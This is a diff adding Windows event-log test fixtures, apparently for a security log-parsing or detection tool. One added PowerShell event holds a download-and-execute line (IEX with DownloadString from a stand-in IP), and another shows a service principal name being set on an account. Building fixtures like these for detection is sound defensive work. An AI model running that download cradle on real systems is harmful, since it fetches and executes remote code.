@@ -72,6 +72,13 @@ FIXTURES: dict[str, list[dict]] = {
         {"raw": "<131>Jun 10 13:55:36 host1 app[99]: disk error", "meta": {}},
     ],
     "windows_eventlog": [
+        {"raw": {"EventID": 4104, "TimeCreated": 1750000006000, "Computer": "wks-jdoe",
+                 "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')"},
+         "meta": {}},
+        {"raw": {"EventID": 5136, "TimeCreated": 1750000007000, "Computer": "dc01", "SubjectUserName": "adm",
+                 "ObjectDN": "CN=svc-sql,OU=Svc,DC=corp,DC=example", "ObjectClass": "user",
+                 "AttributeLDAPDisplayName": "servicePrincipalName", "AttributeValue": "MSSQLSvc/x:1433",
+                 "OperationType": "%%14674"}, "meta": {}},
         {"raw": {"EventID": 7045, "TimeCreated": 1750000003000, "Computer": "wks-jdoe",
                  "SubjectUserName": "jdoe", "ServiceName": "UpdSvc",
                  "ImagePath": r"C:\Users\jdoe\AppData\Local\Temp\upd.exe"}, "meta": {}},
